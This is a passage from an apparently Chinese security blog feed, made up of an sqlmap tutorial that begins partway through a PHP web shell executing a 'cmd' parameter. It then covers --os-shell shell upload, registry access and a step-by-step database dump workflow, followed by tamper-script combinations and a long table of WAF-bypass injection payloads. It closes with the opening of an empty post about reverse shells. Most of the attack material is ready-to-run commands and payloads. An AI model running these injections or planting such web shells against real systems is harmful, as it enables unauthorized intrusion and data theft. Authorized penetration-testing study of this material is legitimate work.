class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">        <span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是一个用于命令执行的代码，命令执行后会将执行的结果输出。</p>
<p>直接在网站访问这两个<code>shell</code>文件就可以看到了</p>
<p>一个提供了一个上传文件的入口，一个提供了一个以<code>cmd</code>参数的命令执行窗口</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</span><br><span class="line"></span><br><span class="line">tmpugvzq.php是可以上传</span><br><span class="line">tmpbylqf.php是可以执行命令</span><br></pre></td></tr></table></figure>

<p>【如果没看到，可以查看<code>wireshark</code>或者先<code>bp</code>抓包数据流并时刻开启监听】</p>
<p><strong>这个时候sqlmap主要做了三件事情：</strong></p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、进行目标的一个基础信息的探测。</span><br><span class="line"><span class="number">2</span>、上传<span class="keyword">shell</span>到目标web网站上。</span><br><span class="line"><span class="number">3</span>、退出时删除<span class="keyword">shell</span>。</span><br></pre></td></tr></table></figure>



<h4 id="2-Database"><a href="#2-Database" class="headerlink" title="2.Database"></a>2.Database</h4><p>数据库支持外连，通过<code>Sqlmap</code>执行<code>--os-shell</code>获取<code>shell</code>。</p>
<p>必要条件：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">数据库支持外连</span><br><span class="line"></span><br><span class="line">数据库权限为<span class="keyword">SA</span>权限</span><br></pre></td></tr></table></figure>

<p><code>Mysql</code>和<code>sqlsever</code>两者的情况不同，详细建议看文章学习</p>
<h3 id="Windows-注册表访问"><a href="#Windows-注册表访问" class="headerlink" title="Windows 注册表访问"></a>Windows 注册表访问</h3><p>这些选项可以被用来访问后端数据库管理系统Windows 注册表。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–reg-read 读一个Windows 注册表项值</span><br><span class="line">–reg-<span class="built_in">add</span> 写一个Windows 注册表项值数据</span><br><span class="line">–reg-del 删除Windows 注册表键值</span><br><span class="line">–<span class="attribute">reg-key</span>=REGKEY Windows 注册表键</span><br><span class="line">–<span class="attribute">reg-value</span>=REGVAL Windows 注册表项值</span><br><span class="line">–<span class="attribute">reg-data</span>=REGDATA Windows 注册表键值数据</span><br><span class="line">–<span class="attribute">reg-type</span>=REGTYPE Windows 注册表项值类型</span><br></pre></td></tr></table></figure>

<h3 id="General（一般）"><a href="#General（一般）" class="headerlink" title="General（一般）"></a>General（一般）</h3><p>这些选项可以用来设置一些一般的工作参数。</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中</span><br><span class="line">-s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line">–<span class="keyword">flush</span>-session 刷新当前目标的会话文件</span><br><span class="line">–fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">–eta 显示每个输出的预计到达时间</span><br><span class="line">–update 更新 SqlMap</span><br><span class="line">–<span class="keyword">save</span> <span class="keyword">file</span> 保存选项到 INI 配置文件</span><br><span class="line">–batch 从不询问用户输入，使用所有默认配置。</span><br></pre></td></tr></table></figure>

<h3 id="Miscellaneous（杂项"><a href="#Miscellaneous（杂项" class="headerlink" title="Miscellaneous（杂项"></a>Miscellaneous（杂项</h3><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">–beep 发现 SQL 注入时提醒</span><br><span class="line">–check-payload IDS 对注入 payloads 的检测测试</span><br><span class="line">–cleanup sqlmap.py 具体的 UDF 和表清理 DBMS</span><br><span class="line">–forms 对目标 URL 的解析和测试形式</span><br><span class="line">–gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果</span><br><span class="line">–page-<span class="built_in">rank</span> Google dork 结果显示网页排名（PR）</span><br><span class="line">–<span class="built_in">parse</span>-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">–replicate 复制转储的数据到一个 sqlite3 数据库</span><br><span class="line">–tor 使用默认的 Tor（Vidalia/ Privoxy/ Polipo）代理地址</span><br><span class="line">–wizard 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>

<h3 id="制定测试的种类"><a href="#制定测试的种类" class="headerlink" title="制定测试的种类"></a>制定测试的种类</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">technique</span>=TECH SQL注入技术测试（默认 BEUST）</span><br><span class="line">Techniques（技巧）：</span><br><span class="line">–technique 测试指定注入类型使用的技术</span><br></pre></td></tr></table></figure>


<p>不加参数默认测试所有注入技术:</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">B:</span> 基于布尔的 SQL 盲注</span><br><span class="line"><span class="symbol">E:</span> 基于显错 sql 注入</span><br><span class="line"><span class="symbol">U:</span> 基于 UNION 注入</span><br><span class="line"><span class="symbol">S:</span> 叠层 sql 注入</span><br><span class="line"><span class="symbol">T:</span> 基于时间盲注</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-判断waf"><a href="#sqlmap-判断waf" class="headerlink" title="sqlmap 判断waf"></a>sqlmap 判断waf</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.test.com/&quot;</span> <span class="params">--identify-waf</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<h2 id="一般注入流程"><a href="#一般注入流程" class="headerlink" title="一般注入流程"></a>一般注入流程</h2><p>以mysql为例</p>
<p>1.验证注入</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">sqlmap -u “注入点<span class="built_in">URL</span>”</span><br></pre></td></tr></table></figure>

<p>从中可以发现存在注入的类型，数据库类型和web应用程序PHP和Apache等版本信息。</p>
<p>2.列举数据库名</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;注入点&quot;</span> <span class="built_in">--dbs</span></span><br><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;注入点&quot;</span> <span class="built_in">--current-db</span>  <span class="comment">#列举当前使用的数据库</span></span><br></pre></td></tr></table></figure>

<p>3.查询某一数据库的所有表名</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;注入点&quot;</span> -D 数据库名 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p>4.列举这一数据库的表的所有列（字段）</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;注入点&quot;</span> -D 数据库名 -<span class="built_in">T</span> 表名 --<span class="built_in">columns</span></span><br></pre></td></tr></table></figure>

<p>5.暴字段内容</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">sqlmap</span> <span class="operator">-</span><span class="variable">u</span> <span class="string">&quot;注入点&quot;</span> <span class="operator">-</span><span class="built_in">D</span> 数据库名 <span class="operator">-</span><span class="variable">T</span> 表名 <span class="operator">-</span><span class="built_in">C</span> <span class="string">&quot;要爆的字段名&quot;</span> <span class="operator">--</span><span class="variable">dump</span></span><br></pre></td></tr></table></figure>

<p>爆一个字段的话可能会很慢或者出错，全部暴出最好。</p>
<p>可以在后面加个 –batch 可以不用手动选择yes或no的选项。</p>
<h3 id="sqlmap-tamper-的使用"><a href="#sqlmap-tamper-的使用" class="headerlink" title="sqlmap tamper 的使用"></a>sqlmap tamper 的使用</h3><p>可以进行各种绕过防火墙和waf</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="attr">--tamper</span> xxx<span class="selector-class">.py</span>  (.py可以不加)</span><br></pre></td></tr></table></figure>

<p><code>eg:python sqlmap.py -u “” – tamper base64encode.py</code><br>1.普通的<code>tamper</code>搭配方式:</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,</span><br><span class="line"><span class="built_in">charencode,</span>charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,space2comment,space2plus,</span><br><span class="line"><span class="built_in">space2randomblank,</span>unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>

<p>2.数据库为<code>MSSQL</code>的搭配方式：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,sp_password,space2comment,</span><br><span class="line"><span class="built_in">space2dash,</span>space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,</span><br><span class="line">unmagicquotes</span><br></pre></td></tr></table></figure>

<p>3.数据库为<code>Mysql</code>的搭配方式:</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,</span><br><span class="line"><span class="built_in">greatest,</span>halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,</span><br><span class="line"><span class="built_in">multiplespaces,</span>nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,</span><br><span class="line"><span class="built_in">space2morehash,</span>space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,</span><br><span class="line"><span class="built_in">versionedkeywords,</span>versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure>

<p>4.常用脚本用法：</p>
<blockquote>
<p><code>apostrophemask.py UTF-8编码</code><br><code>apostrophenullencode.py unicode编码</code><br><code>appendnullbyte.py 添加%00</code><br><code>base64encode.py base64编码</code><br><code>between.py 以”not between”替换”&gt;“</code><br><code>bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“</code><br><code>chardoubleencode.py 双重url编码</code><br><code>charencode.py url编码</code><br><code>charunicodeencode.py 对未进行url编码的字符进行unicode编码</code><br><code>equaltolike.py 以”like”替代”=“</code><br><code>halfversionedmorekeywords.py在每个关键字前添加条件注释</code><br><code>ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)”</code><br><code>modsecurityversioned.py 条件注释</code><br><code>modsecurityzeroversioned.py 条件注释，0000</code><br><code>multiplespaces.py 添加多个空格</code><br><code>nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。）</code><br><code>percentage.py 在每个字符前添加百分号（%）</code><br><code>randomcase.py 随即大小写</code><br><code>randomcomments.py 随机插入区块注释</code><br><code>sp_password.py 语句结尾添加”sp_password”迷惑数据库日志（很。。。）</code><br><code>space2comment.py 以区块注释替换空格</code><br><code>space2dash.py 以单行注释”–”和随机的新行替换空格</code><br><code>space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格</code><br><code>space2morehash.py 没看出来和上面那个有什么区别。。</code><br><code>space2mssqlblank.py 以随机空白字符替换空格</code><br><code>space2mssqlhash.py 以单行注释”#”和新行替换空格</code><br><code>space2mysqlblank.py 以随机空白字符替换空格</code><br><code>space2mysqldash.py 以单行注释和新行替换空格</code><br><code>space2plus.py 以”+”替换空格</code><br><code>space2randomblank.py 随机空白字符替换空格</code><br><code>unionalltounion.py 以”union all”替换”union”</code><br><code>unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”–”</code><br><code>versionedkeywords.py 对不是函数的关键字条件注释</code><br><code>versionedmorekeywords.py 对关键字条件注释</code></p>
</blockquote>
<p> 整理脚本如下：</p>
<table>
<thead>
<tr>
<th>支持的数据库</th>
<th>编号</th>
<th>脚本名称</th>
<th>作用</th>
<th>实现方式</th>
</tr>
</thead>
<tbody><tr>
<td>all</td>
<td>1</td>
<td>apostrophemask.py</td>
<td>用utf8代替引号</td>
<td>(“1 AND ‘1’&#x3D;’1”)  ‘1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871’</td>
</tr>
<tr>
<td>2</td>
<td>base64encode.py</td>
<td>用base64编码替换</td>
<td>(“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;’</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
<td>(‘1 UNION SELECT foobar’) ‘1  UNION   SELECT  foobar’</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>space2plus.py</td>
<td>用+替换空格</td>
<td>(‘SELECT id FROM users’) ‘SELECT+id+FROM+users’</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>nonrecursivereplacement.py</td>
<td>双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如 .replace（“SELECT”、””)） filters</td>
<td>(‘1 UNION SELECT 2–’) ‘1 UNIOUNIONN SELESELECTCT 2–’</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>space2randomblank.py</td>
<td>代替空格字符（“”）从一个随机的空 白字符可选字符的有效集</td>
<td>(‘SELECT id FROM users’) ‘SELECT%0Did%0DFROM%0Ausers’</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
<td>(‘-1 UNION ALL SELECT’) ‘-1 UNION SELECT’</td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>securesphere.py</td>
<td>追加特制的字符串</td>
<td>(‘1 AND 1&#x3D;1’) “1 AND 1&#x3D;1 and ‘0having’&#x3D;’0having’”</td>
<td></td>
</tr>
<tr>
<td>mssql</td>
<td>1</td>
<td>space2hash.py</td>
<td>绕过过滤‘&#x3D;’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
<td>‘1 AND 9227&#x3D;9227’  ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227&#x3D;9227’</td>
</tr>
<tr>
<td>2</td>
<td>equaltolike.py</td>
<td>like 代替等号</td>
<td>* Input: SELECT * FROM users WHERE id&#x3D;1  2 * Output: SELECT * FROM users WHERE id LIKE 1</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>space2mssqlblank.py(mssql)</td>
<td>空格替换为其它空符号</td>
<td>Input: SELECT id FROM users Output: SELECT%08id%02FROM%0Fusers</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
<td>(‘1 AND 9227&#x3D;9227’) ‘1%23%0AAND%23%0A9227&#x3D;9227’</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>sp_password.py</td>
<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
<td>(‘1 AND 9227&#x3D;9227– ‘) ‘1 AND 9227&#x3D;9227– sp_password’</td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
<td></td>
</tr>
<tr>
<td>10</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
<td></td>
</tr>
<tr>
<td>11</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘&#x2F;**&#x2F;’</td>
<td>* Input: SELECT id FROM users * Output: SELECT&#x2F;&#x2F;id&#x2F;&#x2F;FROM&#x2F;**&#x2F;users</td>
<td></td>
</tr>
<tr>
<td>mysql &gt;&#x3D; 5.1.13</td>
<td>1</td>
<td>equaltolike.py</td>
<td>like 代替等号</td>
<td>* Input: SELECT * FROM users WHERE id&#x3D;1  2 * Output: SELECT * FROM users WHERE id LIKE 1</td>
</tr>
<tr>
<td>2</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)&#x3D;A’</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’&#x3D;’1”)  ‘1 AND %00%271%00%27&#x3D;%00%271’</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
<td>(‘IFNULL(1, 2)’) ‘IF(ISNULL(1),2,1)’</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
<td>(‘1 AND 9227&#x3D;9227’) ‘1%23%0AAND%23%0A9227&#x3D;9227’</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
<td>(‘1 AND 2&gt;1–’) ‘1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;–’</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>space2mysqlblank.py</td>
<td>空格替换其它空白符号(mysql)</td>
<td>Input: SELECT id FROM users Output: SELECT%0Bid%0BFROM%A0users</td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>modsecurityzeroversioned.py</td>
<td>包含了完整的查询与零版本注释</td>
<td>(‘1 AND 2&gt;1–’) ‘1 &#x2F;<em>!00000AND 2&gt;1</em>&#x2F;–’</td>
<td></td>
</tr>
<tr>
<td>10</td>
<td>space2mysqldash.py</td>
<td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
<td>(‘1 AND 9227&#x3D;9227’) ‘1–%0AAND–%0A9227&#x3D;9227’</td>
<td></td>
</tr>
<tr>
<td>11</td>
<td>bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td>
<td>(‘SELECT id FROM users where id &#x3D; 1’) ‘SELECT%09id FROM users where id LIKE 1’</td>
<td></td>
</tr>
<tr>
<td>12</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
<td></td>
</tr>
<tr>
<td>13</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
<td></td>
</tr>
<tr>
<td>14</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
<td></td>
</tr>
<tr>
<td>15</td>
<td>versionedkeywords.py</td>
<td>Encloses each non-function keyword with versioned MySQL comment</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# * Output: 1&#x2F;<em>!UNION</em><em>!ALL</em><em>!SELECT</em><em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;<em>!AS</em><em>!CHAR</em>&#x2F;),CHAR(32)),CHAR(58,100,114,117,58))#</td>
<td></td>
</tr>
<tr>
<td>16</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘&#x2F;**&#x2F;’</td>
<td>* Input: SELECT id FROM users * Output: SELECT&#x2F;&#x2F;id&#x2F;&#x2F;FROM&#x2F;**&#x2F;users</td>
<td></td>
</tr>
<tr>
<td>17</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
<td></td>
</tr>
<tr>
<td>18</td>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# * Output: 1&#x2F;<em>!UNION</em><em>!ALL</em><em>!SELECT</em><em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;,&#x2F;<em>!CONCAT</em>&#x2F;(&#x2F;<em>!CHAR</em>&#x2F;(58,122,114,115,58),&#x2F;<em>!IFNULL</em>&#x2F;(CAST(&#x2F;<em>!CURRENT_USER</em>&#x2F;()&#x2F;<em>!AS</em><em>!CHAR</em>&#x2F;),&#x2F;<em>!CHAR</em>&#x2F;(32)),&#x2F;<em>!CHAR</em>&#x2F;(58,115,114,121,58))#</td>
<td></td>
</tr>
<tr>
<td>MySQL &lt; 5.1</td>
<td>19</td>
<td>halfversionedmorekeywords.py</td>
<td>关键字前加注释</td>
<td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’&#x3D;’QDWa * Output: value’&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT(&#x2F;<em>!0CHAR(58,107,112,113,58),&#x2F;</em>!0IFNULL(CAST(&#x2F;<em>!0CURRENT_USER()&#x2F;</em>!0AS&#x2F;<em>!0CHAR),&#x2F;</em>!0CHAR(32)),&#x2F;<em>!0CHAR(58,97,110,121,58)), NULL, NULL#&#x2F;</em>!0AND ‘QDWa’&#x3D;’QDWa</td>
</tr>
<tr>
<td>20</td>
<td>halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加 mysql版本评论</td>
<td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’&#x3D;’QDWa”) 2.”value’&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT(&#x2F;<em>!0CHAR(58,107,112,113,58),&#x2F;</em>!0IFNULL(CAST(&#x2F;<em>!0CURRENT_USER()&#x2F;</em>!0AS&#x2F;<em>!0CHAR),&#x2F;</em>!0CHAR(32)),&#x2F;<em>!0CHAR(58,97,110,121,58)),&#x2F;</em>!0NULL,&#x2F;<em>!0NULL#&#x2F;</em>!0AND ‘QDWa’&#x3D;’QDWa”</td>
<td></td>
</tr>
<tr>
<td>MySQL &gt;&#x3D; 5.1.13</td>
<td>21</td>
<td>space2morehash.py</td>
<td>空格替换为 #号 以及更多随机字符串 换行符</td>
<td>* Input: 1 AND 9227&#x3D;9227 * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227&#x3D;9227</td>
</tr>
<tr>
<td>Oracle</td>
<td>1</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)&#x3D;A’</td>
</tr>
<tr>
<td>2</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’&#x3D;’1”)  ‘1 AND %00%271%00%27&#x3D;%00%271’</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘&#x2F;**&#x2F;’</td>
<td>* Input: SELECT id FROM users * Output: SELECT&#x2F;&#x2F;id&#x2F;&#x2F;FROM&#x2F;**&#x2F;users</td>
<td></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>1</td>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A &gt; B’) ‘1 AND GREATEST(A,B+1)&#x3D;A’</td>
</tr>
<tr>
<td>2</td>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’&#x3D;’1”)  ‘1 AND %00%271%00%27&#x3D;%00%271’</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>between.py</td>
<td>用between替换大于号（&gt;）</td>
<td>(‘1 AND A &gt; B–’) ‘1 AND A NOT BETWEEN 0 AND B–’</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>percentage.py</td>
<td>asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>charencode.py</td>
<td>url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>randomcase.py</td>
<td>随机大小写</td>
<td>* Input: INSERT * Output: InsERt</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>charunicodeencode.py</td>
<td>字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>space2comment.py</td>
<td>Replaces space character (‘ ‘) with comments ‘&#x2F;**&#x2F;’</td>
<td>* Input: SELECT id FROM users * Output: SELECT&#x2F;&#x2F;id&#x2F;&#x2F;FROM&#x2F;**&#x2F;users</td>
<td></td>
</tr>
<tr>
<td>Access</td>
<td>1</td>
<td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
<td>(‘1 AND 1&#x3D;1’) ‘1 AND 1&#x3D;1%00’</td>
</tr>
<tr>
<td>其他</td>
<td></td>
<td>chardoubleencode.py</td>
<td>双url编码(不处理以编码的)</td>
<td>* Input: SELECT FIELD FROM%20TABLE * Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td>
</tr>
<tr>
<td></td>
<td>unmagicquotes.py</td>
<td>宽字符绕过 GPC addslashes</td>
<td>* Input: 1′ AND 1&#x3D;1 * Output: 1%bf%27 AND 1&#x3D;1–%20</td>
<td></td>
</tr>
<tr>
<td></td>
<td>randomcomments.py</td>
<td>用&#x2F;**&#x2F;分割sql关键字</td>
<td>‘INSERT’ becomes ‘IN&#x2F;&#x2F;S&#x2F;&#x2F;ERT’</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/Reverses-shell/</url>
    <content><![CDATA[<p><code>监听，弹弹弹</code></p>
<span id="more"></span>

